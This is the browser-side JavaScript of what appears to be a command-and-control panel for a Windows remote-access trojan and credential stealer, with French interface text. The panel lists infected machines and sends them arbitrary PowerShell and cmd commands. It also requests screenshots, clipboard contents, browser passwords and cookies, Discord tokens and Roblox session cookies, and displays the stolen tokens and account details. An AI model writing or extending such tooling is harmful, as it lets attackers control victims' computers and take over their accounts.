let currentClient = null;
let clientsData = [];
let processingTimer = null;
let commandStartTime = null;

document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', (e) => {
        e.preventDefault();
        document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
        item.classList.add('active');
        const page = item.dataset.page;
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(`${page}-page`).classList.add('active');
        document.getElementById('page-title').innerText = item.innerText.trim();
        if (page === 'clients') loadClients();
        if (page === 'activities') loadActivities();
    });
});

function refreshAll() {
    loadStats();
    if (document.getElementById('clients-page').classList.contains('active')) loadClients();
    if (document.getElementById('activities-page').classList.contains('active')) loadActivities();
    loadRecentActivities();
}

async function loadStats() {
    try {
        const res = await fetch('/api/stats');
        const stats = await res.json();
        document.getElementById('total-clients').innerText = stats.total_clients;
        document.getElementById('online-clients').innerText = stats.online_clients;
        document.getElementById('pending-commands').innerText = stats.pending_commands;
        document.getElementById('executed-commands').innerText = stats.executed_commands;
    } catch(e) { console.error(e); }
}

async function loadClients() {
    try {
        const res = await fetch('/api/clients');
        const clients = await res.json();
        clientsData = clients;
        renderClients(clients);
    } catch(e) { console.error(e); }
}

function formatBytes(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function renderClients(clients) {
    const container = document.getElementById('clients-grid');
    if (!clients.length) {
        container.innerHTML = '<div class="no-data">Aucun client</div>';
        return;
    }
    container.innerHTML = clients.map(client => {
        const diskTotal = client.disk_total || 0;
        const diskFree = client.disk_free || 0;
        const diskUsed = diskTotal - diskFree;
        const ramTotal = client.ram_total || 0;
        const ramAvailable = client.ram_available || 0;
        const ramUsed = ramTotal - ramAvailable;
        return `
        <div class="client-card ${client.online ? 'online' : 'offline'}" onclick="openCommandModal('${client.machine_id}', '${escapeHtml(client.computer_name || client.machine_id)}')">
            <div class="client-header">
                <div class="client-name"><i class="fas fa-${client.online?'circle':'circle-o'}"></i> ${escapeHtml(client.computer_name || client.machine_id)}</div>
                <div class="client-status ${client.online?'online':'offline'}">${client.online?'En ligne':'Hors ligne'}</div>
            </div>
            <div class="client-details">
                <p><i class="fas fa-user"></i> ${escapeHtml(client.username || '?')}</p>
                <p><i class="fab fa-windows"></i> ${escapeHtml(client.windows_version || '?')}</p>
                <p><i class="fas fa-globe"></i> ${escapeHtml(client.ip || '?')}</p>
                <p><i class="fas fa-hdd"></i> ${formatBytes(diskUsed)} / ${formatBytes(diskTotal)}</p>
                <p><i class="fas fa-memory"></i> ${formatBytes(ramUsed)} / ${formatBytes(ramTotal)}</p>
                <p><i class="far fa-clock"></i> ${formatDate(client.last_seen)}</p>
            </div>
        </div>`;
    }).join('');
}

function filterClients() {
    const s = document.getElementById('client-search').value.toLowerCase();
    const filtered = clientsData.filter(c => 
        (c.computer_name||'').toLowerCase().includes(s) ||
        (c.username||'').toLowerCase().includes(s) ||
        (c.ip||'').includes(s)
    );
    renderClients(filtered);
}

function formatDate(d) {
    if (!d) return 'Jamais';
    try {
        const date = new Date(d);
        const now = new Date();
        const diff = Math.floor((now - date) / 60000);
        if (diff < 1) return 'À l\'instant';
        if (diff < 60) return `Il y a ${diff} min`;
        if (diff < 1440) return `Il y a ${Math.floor(diff/60)}h`;
        return date.toLocaleDateString();
    } catch(e) { return d; }
}

function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
}

// --- COMMANDE ---
function openCommandModal(machineId, clientName) {
    currentClient = machineId;
    document.getElementById('modal-client-name').innerText = clientName;
    document.getElementById('command-modal').style.display = 'block';
    document.getElementById('command-params-group').style.display = 'none';
    document.getElementById('command-params').value = '';
}

document.getElementById('command-type').addEventListener('change', function() {
    const paramsGroup = document.getElementById('command-params-group');
    const type = this.value;
    if (type === 'execute_ps' || type === 'execute_cmd') {
        paramsGroup.style.display = 'block';
        document.getElementById('command-params').value = type === 'execute_ps' ? 'Get-Process | Select-Object -First 10' : 'dir';
    } else {
        paramsGroup.style.display = 'none';
    }
});

async function executeCommand() {
    const commandType = document.getElementById('command-type').value;
    let params = {};
    if (commandType === 'execute_ps' || commandType === 'execute_cmd') {
        params = { command: document.getElementById('command-params').value };
    } else if (commandType === 'kill_process') {
        const pid = prompt('PID :');
        if (pid) params = { pid: parseInt(pid) };
    }
    // Enregistrer l'heure d'envoi pour le ping
    commandStartTime = Date.now();
    try {
        const res = await fetch('/api/send_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ machine_id: currentClient, command_type: commandType, params: params })
        });
        const data = await res.json();
        if (data.command_id) {
            closeModal();
            showProcessing(data.command_id, data.command_type);
        } else {
            alert('Erreur : ' + (data.error || 'inconnue'));
        }
    } catch(e) {
        alert('Erreur réseau');
    }
}

function showProcessing(commandId, commandType) {
    document.getElementById('processing-modal').style.display = 'block';
    let seconds = 0;
    document.getElementById('processing-timer').innerText = '0s';
    clearInterval(processingTimer);
    processingTimer = setInterval(() => {
        seconds++;
        document.getElementById('processing-timer').innerText = seconds + 's';
    }, 1000);
    waitForResult(commandId);
}

async function waitForResult(commandId, attempts = 0) {
    if (attempts > 30) {
        clearInterval(processingTimer);
        document.getElementById('processing-modal').style.display = 'none';
        alert('Timeout');
        return;
    }
    try {
        const res = await fetch(`/api/command_result/${commandId}`);
        const data = await res.json();
        if (data.status === 'executed') {
            clearInterval(processingTimer);
            document.getElementById('processing-modal').style.display = 'none';
            const pingMs = Date.now() - commandStartTime;
            showResult(data.result, data.command_type, pingMs);
        } else {
            setTimeout(() => waitForResult(commandId, attempts + 1), 2000);
        }
    } catch(e) {
        setTimeout(() => waitForResult(commandId, attempts + 1), 2000);
    }
}

function showResult(result, commandType, pingMs = null) {
    const content = document.getElementById('result-content');
    const title = document.getElementById('result-title');
    const icons = {
        ping: 'fa-heartbeat',
        system_info: 'fa-info-circle',
        discord_data: 'fab fa-discord',
        roblox_cookie: 'fa-gamepad',
        browser_passwords: 'fa-key',
        browser_cookies: 'fa-cookie-bite',
        screenshot: 'fa-camera',
        clipboard: 'fa-copy',
        list_processes: 'fa-list',
        execute_ps: 'fa-code',
        execute_cmd: 'fa-terminal'
    };
    title.innerHTML = `<i class="fas ${icons[commandType] || 'fa-check-circle'}"></i> ${commandType}`;

    if (commandType === 'ping') {
        content.innerHTML = `
            <div class="card-result ping-result">
                <i class="fas fa-heartbeat" style="font-size:48px;color:#22c55e;"></i>
                <p>Ping : <strong>${pingMs} ms</strong></p>
                <p>${result.timestamp || ''}</p>
            </div>`;
    }
    else if (commandType === 'system_info') {
        const r = result;
        const diskUsed = (r.disk?.total||0) - (r.disk?.free||0);
        const ramUsed = (r.ram?.total||0) - (r.ram?.available||0);
        content.innerHTML = `
            <div class="card-result">
                <h3><i class="fas fa-desktop"></i> ${escapeHtml(r.computer_name)}</h3>
                <p><i class="fas fa-user"></i> ${escapeHtml(r.username)}</p>
                <p><i class="fab fa-windows"></i> ${escapeHtml(r.windows_version)}</p>
                <p><i class="fas fa-globe"></i> ${escapeHtml(r.ip)}</p>
                <p><i class="fas fa-hdd"></i> ${formatBytes(diskUsed)} / ${formatBytes(r.disk?.total||0)}</p>
                <p><i class="fas fa-memory"></i> ${formatBytes(ramUsed)} / ${formatBytes(r.ram?.total||0)}</p>
            </div>`;
    }
    else if (commandType === 'discord_data') {
        if (!result || result.length === 0) return content.innerHTML = '<p>Aucun token trouvé.</p>';
        let html = '<div class="discord-grid">';
        result.forEach(tokenInfo => {
            const avatarUrl = `https://cdn.discordapp.com/avatars/${tokenInfo.user_id}/${tokenInfo.avatar || 'default.png'}?size=128`;
            html += `
            <div class="discord-card">
                <img src="${avatarUrl}" class="discord-avatar" onerror="this.onerror=null;this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
                <div class="discord-info">
                    <h3>${escapeHtml(tokenInfo.username)}#${tokenInfo.discriminator}</h3>
                    <p><i class="fas fa-id-badge"></i> ${tokenInfo.user_id}</p>
                    <p><i class="fas fa-envelope"></i> ${tokenInfo.email || 'N/A'}</p>
                    <p><i class="fas fa-phone"></i> ${tokenInfo.phone || 'N/A'}</p>
                    <p><i class="fas fa-shield-alt"></i> MFA: ${tokenInfo.mfa_enabled ? '✅' : '❌'}</p>
                    <p><i class="fas fa-server"></i> Guilds: ${tokenInfo.guilds_count}</p>
                    <p><i class="fas fa-crown"></i> Nitro: ${tokenInfo.has_nitro ? `✅ (expire: ${tokenInfo.nitro_expiry || '?'})` : '❌'}</p>
                    <p><i class="fas fa-rocket"></i> Boosts: ${tokenInfo.available_boosts}</p>
                    <div class="token-box">
                        <code>${escapeHtml(tokenInfo.token)}</code>
                    </div>
                </div>
            </div>`;
        });
        html += '</div>';
        content.innerHTML = html;
    }
    else if (commandType === 'roblox_cookie') {
        if (result && result.cookie) {
            content.innerHTML = `
                <div class="card-result">
                    <h3><i class="fas fa-gamepad"></i> Cookie Roblox</h3>
                    <p>Utilisateur : ${escapeHtml(result.username || 'Inconnu')}</p>
                    <div class="token-box"><code>${escapeHtml(result.cookie)}</code></div>
                </div>`;
        } else {
            content.innerHTML = '<p>Aucun cookie Roblox trouvé.</p>';
        }
    }
    else if (commandType === 'screenshot') {
        if (result && result.length) {
            let html = '';
            result.forEach((img, i) => {
                html += `
                <div class="screenshot-item" onclick="openLightbox('${img.data}')">
                    <h3>Moniteur ${img.monitor || (i+1)}</h3>
                    <img src="data:image/png;base64,${img.data}" class="screenshot-thumb">
                </div>`;
            });
            content.innerHTML = html;
        } else {
            content.innerHTML = '<p>Aucune capture.</p>';
        }
    }
    else if (typeof result === 'string') {
        content.innerHTML = `<pre>${escapeHtml(result)}</pre>`;
    }
    else {
        content.innerHTML = `<pre>${escapeHtml(JSON.stringify(result, null, 2))}</pre>`;
    }
    document.getElementById('result-modal').style.display = 'block';
}

function openLightbox(base64data) {
    const lb = document.getElementById('lightbox-modal');
    document.getElementById('lightbox-img').src = 'data:image/png;base64,' + base64data;
    lb.style.display = 'block';
}

function closeLightbox() {
    document.getElementById('lightbox-modal').style.display = 'none';
}

document.getElementById('lightbox-modal').addEventListener('click', closeLightbox);
document.getElementById('lightbox-img').addEventListener('click', (e) => e.stopPropagation());

function closeModal() {
    document.getElementById('command-modal').style.display = 'none';
}

function closeResultModal() {
    document.getElementById('result-modal').style.display = 'none';
}

window.onclick = function(event) {
    if (event.target === document.getElementById('command-modal')) closeModal();
    if (event.target === document.getElementById('result-modal')) closeResultModal();
};

// Activités
async function loadRecentActivities() {
    try {
        const res = await fetch('/api/activities');
        const acts = await res.json();
        const container = document.getElementById('recent-activities');
        if (!acts.length) return container.innerHTML = '<div class="activity-item">Aucune activité</div>';
        container.innerHTML = acts.slice(0,10).map(act => `
            <div class="activity-item">
                <i class="fas ${getActivityIcon(act.action)} activity-icon"></i>
                <div class="activity-content">
                    <span>${escapeHtml(act.action)}</span>
                    ${act.details ? `<small>${escapeHtml(act.details)}</small>` : ''}
                </div>
                <span class="activity-time">${formatDate(act.timestamp)}</span>
            </div>`).join('');
    } catch(e) {}
}

async function loadActivities() {
    try {
        const res = await fetch('/api/activities');
        const acts = await res.json();
        const container = document.getElementById('activities-full');
        if (!acts.length) return container.innerHTML = '<div class="activity-item">Aucune</div>';
        container.innerHTML = acts.map(act => `
            <div class="activity-item">
                <i class="fas ${getActivityIcon(act.action)} activity-icon"></i>
                <div class="activity-content">
                    <span>${escapeHtml(act.action)}</span>
                    ${act.machine_id ? `<small>${escapeHtml(act.machine_id)}</small>` : ''}
                    ${act.details ? `<small>${escapeHtml(act.details)}</small>` : ''}
                </div>
                <span class="activity-time">${formatDate(act.timestamp)}</span>
            </div>`).join('');
    } catch(e) {}
}

function getActivityIcon(action) {
    const map = {
        'heartbeat': 'fa-heartbeat',
        'send_command': 'fa-bolt',
        'command_result': 'fa-check-circle',
        'login': 'fa-sign-in-alt',
        'logout': 'fa-sign-out-alt'
    };
    return map[action] || 'fa-circle';
}

loadStats();
loadRecentActivities();
setInterval(() => {
    loadStats();
    if (document.getElementById('clients-page').classList.contains('active')) loadClients();
}, 10000);